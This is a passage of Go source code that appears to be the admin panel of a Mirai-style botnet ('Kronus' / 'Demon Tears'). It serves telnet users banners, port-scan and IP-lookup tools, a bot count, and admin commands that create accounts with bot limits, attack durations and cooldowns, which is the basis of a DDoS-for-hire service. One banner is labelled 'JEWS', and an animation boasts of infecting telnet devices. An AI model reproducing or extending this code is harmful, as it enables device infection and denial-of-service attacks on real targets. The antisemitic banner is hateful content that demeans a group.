			this.conn.Write([]byte("\t   \x1b[0;34m88~~~88\x1b[0;37m 88~~~  \x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88   88\x1b[0;37m 88     \x1b[0;34m `8b  d8'\x1b[0;37m 88booo.\x1b[0;34m 88booo. \x1b[0;37m `8b  d8' \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34mYP   YP\x1b[0;37m 88     \x1b[0;34m  `Y88P' \x1b[0;37m Y88888P\x1b[0;34m Y88888P \x1b[0;37m  `Y88P'  \r\n"))
			this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        continue
		}
        if cmd == "doom" || cmd == "DOOM" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[1;31m        d8888b.  .d88b.   .d88b.  .88b  d88.        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;31m        88  `8D .8P  Y8. .8P  Y8. 88'YbdP`88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;33m        88   88 88    88 88    88 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;33m        88   88 88    88 88    88 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m        88  .8D `8b  d8' `8b  d8' 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m        Y8888D'  `Y88P'   `Y88P'  YP  YP  YP        \r\n"))
            continue
        }
        if err != nil || cmd == "cayosin" || cmd == "CAYOSIN" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;36m                 ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[00;0m                 ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[0;90m                 ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ║\x1b[90m- - - - - \x1b[1;36m彼   ら  の  心   を  切  る\x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ║\x1b[90m- - - - - \x1b[0mType \x1b[1;36mHELP \x1b[0mfor \x1b[1;36mCommands List \x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n"))
            continue
		}
		if err != nil || cmd == "HYBRID" || cmd == "hybrid" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[0;31mUsername\x1b[0;37m: \033[0m" + username + "\r\n"))
			this.conn.Write([]byte("\r\x1b[0;31mPassword\x1b[0;37m: **********\033[0m\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\r\x1b[0;37m     [\x1b[0;31mようこそ\x1b[0;37m] HYBRID BUILD ONE - KNOWLEDGE IS POWER [\x1b[0;31mようこそ\x1b[0;37m]        \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\r\x1b[0;37m   ▄█    █▄    ▄██   ▄   ▀█████████▄     ▄████████  ▄█  ████████▄   \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m   ███    ███   ███   ██▄   ███    ███   ███    ███ ███  ███   ▀███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    ███   ███▄▄▄███   ███    ███   ███    ███ ███▌ ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███  ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███▌ ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m ▀▀███▀▀▀▀███▀  ▄██   ███ ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███▌ ███    ███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    ███   ███   ███   ███    ██▄ ▀███████████ ███  ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m   ███    ███   ███   ███   ███    ███   ███    ███ ███  ███   ▄███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    █▀     ▀█████▀  ▄█████████▀    ███    ███ █▀   ████████▀   \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m                                         ███    ███                 \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
        if err != nil || cmd == "timeout" || cmd == "TIMEOUT" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;35m             \r\n"))
            this.conn.Write([]byte("\033[1;30m             \r\n\033[0m"))
            this.conn.Write([]byte("\033[1;92m            ████████\033[95m╗\033[92m██\033[95m╗\033[92m███\033[95m╗   \033[92m███\033[95m╗\033[92m███████\033[95m╗ \033[92m██████\033[95m╗ \033[92m██\033[95m╗   \033[92m██\033[95m╗\033[92m████████\033[95m╗      \r\n"))
            this.conn.Write([]byte("\033[1;95m            ╚══██╔══╝██║████╗ ████║██╔════╝██╔═══██╗██║   ██║╚══██╔══╝      \r\n"))
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m╔\033[92m████\033[95m╔\033[92m██\033[95m║\033[92m█████\033[95m╗  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n"))
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║╚\033[92m██\033[95m╔╝\033[92m██\033[95m║\033[92m██\033[95m╔══╝  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n"))    
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033]95m║\033[92m ██\033[95m║ ╚═╝ \033[92m██\033[95m║\033[92m███████\033[95m╗╚\033[92m██████\033[95m╔╝╚\033[92m██████\033[95m╔╝   \033[92m██\033[95m║         \r\n"))
            this.conn.Write([]byte("\033[1;95m               ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝    ╚═╝         \r\n"))
            this.conn.Write([]byte("\033[1;92m             \r\n"))
            this.conn.Write([]byte("\x1b[0;37m             \r\n\x1b[0m"))
            continue
        }  
        if err != nil || cmd == "JEWS" || cmd == "jews" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[0m               ▄▀▄               \r\n")) // super cool banner
            this.conn.Write([]byte("\x1b[0m             ▄▀░░░▀▄             \r\n"))
            this.conn.Write([]byte("\x1b[0m           ▄▀░░░░▄▀█             \r\n"))
            this.conn.Write([]byte("\x1b[0m         ▄▀░░░░▄▀ ▄▀ ▄▀▄         \r\n"))
            this.conn.Write([]byte("\x1b[0m       ▄▀░░░░▄▀ ▄▀ ▄▀░░░▀▄       \r\n"))
            this.conn.Write([]byte("\x1b[0m       █▀▄░░░░▀█ ▄▀░░░░░░░▀▄     \r\n"))
            this.conn.Write([]byte("\x1b[0m   ▄▀▄ ▀▄ ▀▄░░░░▀░░░░▄█▄░░░░▀▄   \r\n"))
            this.conn.Write([]byte("\x1b[0m ▄▀░░░▀▄ ▀▄ ▀▄░░░░░▄▀ █ ▀▄░░░░▀▄ \r\n"))
            this.conn.Write([]byte("\x1b[0m █▀▄░░░░▀▄ █▀░░░░░░░▀█ ▀▄ ▀▄░▄▀█ \r\n"))
            this.conn.Write([]byte("\x1b[0m ▀▄ ▀▄░░░░▀░░░░▄█▄░░░░▀▄ ▀▄ █ ▄▀ \r\n"))
            this.conn.Write([]byte("\x1b[0m   ▀▄ ▀▄░░░░░▄▀ █ ▀▄░░░░▀▄ ▀█▀   \r\n"))
            this.conn.Write([]byte("\x1b[0m     ▀▄ ▀▄░▄▀ ▄▀ █▀░░░░▄▀█       \r\n"))
            this.conn.Write([]byte("\x1b[0m      ▀▄ █ ▄▀ ▄▀░░░░▄▀ ▄▀        \r\n"))
            this.conn.Write([]byte("\x1b[0m        ▀█▀ ▄▀░░░░▄▀ ▄▀          \r\n"))
            this.conn.Write([]byte("\x1b[0m            █▀▄░▄▀ ▄▀            \r\n"))
            this.conn.Write([]byte("\x1b[0m             ▀▄ █ ▄▀             \r\n"))
            this.conn.Write([]byte("\x1b[0m               ▀█▀               \r\n"))
            this.conn.Write([]byte("\x1b[0m                                 \r\n"))
            continue
        }
		
		if err != nil || cmd == "TOOLS" || cmd == "TOOL" || cmd == "tool" || cmd == "tools" {
            this.conn.Write([]byte("\033[37m╔═══════════════════════════════════╗\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[36m Ping         \033[31m- \033[0mPing an IPv4       \033[37m║\033[0m\r\n")) // some cmds dont work, again i didnt release it fully
            this.conn.Write([]byte("\033[37m║\031[36m IPLookup     \033[31m- \033[0mLookup IPv4        \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[36m PortScan     \033[31m- \033[0mPortscan IPv4      \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[36m Resolve      \033[31m- \033[0mResolve a URL      \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[36m ReverseDNS   \033[31m- \033[0mFind DNS of an IPv4\033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[36m ASNLookup    \033[31m- \033[0mFind ASN of an IPv4\033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[36m TraceRoute   \033[31m- \033[0mTraceroute On IPv4 \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[36m SubnetCalc   \033[31m- \033[0mCalculate A Subnet \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[31m WhoIs        \033[31m- \033[0mWHOIS Search       \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\031[36m ZoneTransfer \033[31m- \033[0mShows ZT           \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m╚═══════════════════════════════════╝\033[0m\r\n"))
            continue
        }
                              if cmd == "WOAH" || cmd == "woah" {
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[1;91m                         A Normal Day in the Life of a bin, infecting shitty telnets                                                                           \r\n"))
    this.conn.Write([]byte("\033[0;37m     ____.-.____                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m    [___________]                                                                                              \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)                                                                                             \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| BIN |||`                                                                                              \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                                                               \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                                                               \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                                                               \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|                                                                                               \r\n"))
    time.Sleep(3 * time.Second)    
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                          
    this.conn.Write([]byte("\033[1;91m                          A Wild dns just appeared, oh no its targeting the bin !!!                     \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                                  \033[33m                              ;-.               ,                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                                  \033[33m                               \\ '.           .'/                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                                  \033[33m                                \\  \\ .---. .-' /                                         \r\n"))
    this.conn.Write([]byte("\033[0;37m                                  \033[33m                                '. '     `_.'                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     ____.-.____                  \033[33m                                 |(),()  |     ,                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m    [___________]                 \033[33m                                 (  __   /   .' \\                                        \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)                \033[33m                                 .''.___.'--,/ _,|                                     \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| BIN |||`                 \033[33m                                {  /     \\   }   |                                      \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                  \033[33m                                 '.\\     /_.'    /                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                  \033[33m                                   |'-.-',  `; _.'                                  \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||                  \033[33m                                   |  |  |   |`                                   \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||                  \033[33m                                   ---|  |----                                     \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|                  \033[33m                                                                        \r\n"))    
           time.Sleep(3 * time.Second)    
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                          
    this.conn.Write([]byte("\033[1;91m                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                             \033[0;91m                                 \033[33m    ;-.               ,                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                             \033[0;91m                                 \033[33m     \\ '.           .'/                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                             \033[0;91m                                 \033[33m      \\  \\ .---. .-' /                                         \r\n"))
    this.conn.Write([]byte("\033[0;37m                             \033[0;91m                                 \033[33m      '. '     `_.'                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     ____.-.____             \033[0;91m                                 \033[33m       |(),()  |     ,                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m    [___________]            \033[0;91m                                 \033[33m       (  __   /   .' \\                                        \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)           \033[0;95m        __                       \033[33m       .''.___.'--,/ _,|                                     \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| BIN |||`            \033[0;95m       |__|                      \033[33m      {  /     \\   }   |                                      \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||             \033[0;91m                                 \033[33m       '.\\     /_.'    /                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||             \033[0;91m                                 \033[33m         |'-.-',  `; _.'                                  \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||             \033[0;91m                                 \033[33m         |  |  |   |`                                   \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||             \033[0;91m                                 \033[33m         ---|  |----                                     \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|             \033[0;91m                                 \033[33m                                              \r\n"))    
    time.Sleep(1 * time.Second)
this.conn.Write([]byte("\033[2J\033[1H"))                                                                          
    this.conn.Write([]byte("\033[1;91m                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                  \033[0;91m                                            \033[33m    ;-.               ,                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                  \033[0;91m                                            \033[33m     \\ '.           .'/                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                  \033[0;91m                                            \033[33m      \\  \\ .---. .-' /                                         \r\n"))
    this.conn.Write([]byte("\033[0;37m                  \033[0;91m                                            \033[33m      '. '     `_.'                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     ____.-.____  \033[0;91m                                            \033[33m       |(),()  |     ,                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m    [___________] \033[0;91m                                            \033[33m       (  __   /   .' \\                                        \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)\033[0;95m __                                         \033[33m       .''.___.'--,/ _,|                                     \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| BIN |||` \033[0;95m|__|                                        \033[33m      {  /     \\   }   |                                      \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||  \033[0;91m                                            \033[33m       '.\\     /_.'    /                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||  \033[0;91m                                            \033[33m         |'-.-',  `; _.'                                  \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||  \033[0;91m                                            \033[33m         |  |  |   |`                                   \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||  \033[0;91m                                            \033[33m         ---|  |----                                     \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|  \033[0;91m                                            \033[33m                                              \r\n"))    
time.Sleep(1 * time.Second)
this.conn.Write([]byte("\033[2J\033[1H"))                                                                          
    this.conn.Write([]byte("\033[1;91m                          Oh No that Helios just killed your bin !                     \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                        \033[33m    ;-.               ,                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                        \033[33m     \\ '.           .'/                                          \r\n"))
    this.conn.Write([]byte("\033[0;91m      ,.   (   .                                                        \033[33m      \\  \\ .---. .-' /                                         \r\n"))
    this.conn.Write([]byte("\033[0;91m      (     )                                                           \033[33m      '. '     `_.'                                       \r\n"))
    this.conn.Write([]byte("\033[0;91m    .; )  ' ((                                                          \033[33m       |(),()  |     ,                                       \r\n"))
    this.conn.Write([]byte("\033[0;91m     _ ., ,._'_.                                                        \033[33m       (  __   /   .' \\                                        \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)                                                      \033[33m       .''.___.'--,/ _,|                                     \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| OOF |||`                                                       \033[33m      {  /     \\   }   |                                      \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                        \033[33m       '.\\     /_.'    /                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                        \033[33m         |'-.-',  `; _.'                                  \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                        \033[33m         |  |  |   |`                                   \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                        \033[33m         ---|  |----                                     \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|                                                        \033[33m                                              \r\n"))    
    time.Sleep(3 * time.Second)       
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[0;92m                  HAKKA              \r\n"))
    this.conn.Write([]byte("\033[0;91m                   >>------>\r\n"))
               continue
		}
		if err != nil || cmd == "/IPLOOKUP" || cmd == "/iplookup" {
            this.conn.Write([]byte("\x1b[95mIP Address\x1b[95m: \x1b[95m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[95m: \r\n\x1b[95m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/PORTSCAN" || cmd == "/portscan" {                  
            this.conn.Write([]byte("\x1b[95mIP Address\x1b[95m: \x1b[95m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[95m: \r\n\x1b[95m" + locformatted + "\r\n"))
            
        }

        if err != nil || cmd == "/traceroute" || cmd == "/TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[95mIP Address\x1b[95m: \x1b[95m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[95m: \r\n\x1b[95m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/resolve" || cmd == "/RESOLVE" {                  
            this.conn.Write([]byte("\x1b[95mWebsite (Without www.)\x1b[95m: \x1b[95m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[95m: \r\n\x1b[95m" + locformatted + "\r\n"))
		}
		      if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[37m ╔═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[95m/addbasic - \033[095mAdd Basic Client    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[95m/addadmin - \033[095mAdd Admin Client    \033[31m║ \r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[95m/remove    - \033[095mRemove User        \033[31m║ \r\n"))
            this.conn.Write([]byte("\033[37m ╚═════════════════════════════════╝  \r\n"))
            continue
        }
		
				if userInfo.admin == 1 && cmd == "server" {
            this.conn.Write([]byte("\033[31m ╔═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[37m ║ \033[31mbots      - \033[31mShow botcount       \033[31m║\r\n"))
            this.conn.Write([]byte("\033[37m ║ \033[31mcls       - \033[31mClea screen         \033[31m║ \r\n"))
            this.conn.Write([]byte("\033[31m ╚═════════════════════════════════╝  \r\n"))
            continue
        }
		
		if cmd == "info" || cmd == "INFO" || cmd == "Info" {

	this.conn.Write([]byte("\033[37m   Crafted By : Extro & Butterfly Through Tears And \033[31mBlood\r\n"))
	  this.conn.Write([]byte("\033[95m   🐉D E M O N TEARS🐉🐉D E M O N TEARS🐉🐉D E M O N TEARS🐉\r\n"))
	  this.conn.Write([]byte("\033[95m \r\n"))
            continue
        }
		
		
		 if cmd == "cls" || cmd == "clear" || cmd == "c" {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[31m                       ╦╔═┬─┐┌─┐┌┐┌┬ ┬┌─┐               \r\n"))
	this.conn.Write([]byte("\033[31m                       ╠╩╗├┬┘│ │││││ │└─┐  𝓚𝓻𝓸𝓷𝓾𝓼 𝓿.1 \r\n"))
	this.conn.Write([]byte("\033[31m                       ╩ ╩┴└─└─┘┘└┘└─┘└─┘                \r\n"))
	this.conn.Write([]byte("\033[37m                     ꧁🐉D E M O N TEARS🐉꧁               \r\n"))
	
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots
		
			if userInfo.admin == 1 && cmd == "/addbasic" {
            this.conn.Write([]byte("\033[31mUsername:\033[95m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[31mPassword:\033[95m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[31mBotcount\033[95m(\033[95m-1 for access to all\033[95m)\033[95m:\033[95m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[95m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[31mAttack Duration\033[95m(\033[95m-1 for none\033[95m)\033[95m:\033[95m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[31m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[31mCooldown\033[31m(\033[31m0 for none\033[31m)\033[95m:\033[31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[31m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[31m- New user info - \r\n- Username - \033[31m" + new_un + "\r\n\033[31m- Password - \033[31m" + new_pw + "\r\n\033[31m- Bots - \033[31m" + max_bots_str + "\r\n\033[31m- Max Duration - \033[31m" + duration_str + "\r\n\033[31m- Cooldown - \033[31m" + cooldown_str + "   \r\n\033[31mContinue? \033[31m(\033[01;32my\033[95m/\033[1;31mn\033[95m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[95m\r\n"))
            }
            continue
        }
		
		if userInfo.admin == 1 && cmd == "/addadmin" {
            this.conn.Write([]byte("\033[31mUsername:\033[31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[31mPassword:\033[31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mBotcount\033[95m(\033[95m-1 for access to all\033[95m)\033[95m:\033[95m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[95mAttack Duration\033[95m(\033[95m-1 for none\033[95m)\033[95m:\033[95m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[95mCooldown\033[95m(\033[95m0 for none\033[95m)\033[95m:\033[95m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[95m- New user info - \r\n- Username - \033[95m" + new_un + "\r\n\033[95m- Password - \033[95m" + new_pw + "\r\n\033[95m- Bots - \033[95m" + max_bots_str + "\r\n\033[95m- Max Duration - \033[95m" + duration_str + "\r\n\033[95m- Cooldown - \033[95m" + cooldown_str + "   \r\n\033[95mContinue? \033[95m(\033[01;32my\033[95m/\033[1;31mn\033[95m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
